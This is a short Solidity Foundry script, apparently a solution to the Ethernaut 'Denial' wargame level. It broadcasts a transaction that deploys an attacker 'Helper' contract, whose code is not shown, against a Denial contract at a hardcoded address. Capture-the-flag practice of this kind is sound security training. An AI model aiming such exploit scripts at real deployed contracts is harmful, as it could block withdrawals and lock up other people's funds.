// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {Denial} from "../../src/Ethernaut/Denial.sol";
import {Helper} from "../../test/Ethernaut/Denial.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Denial denial = Denial(
            payable(0x0c3139764C0dED84724A84904BBBbF445a56707f)
        );
        new Helper(denial);
        vm.stopBroadcast();
    }
}
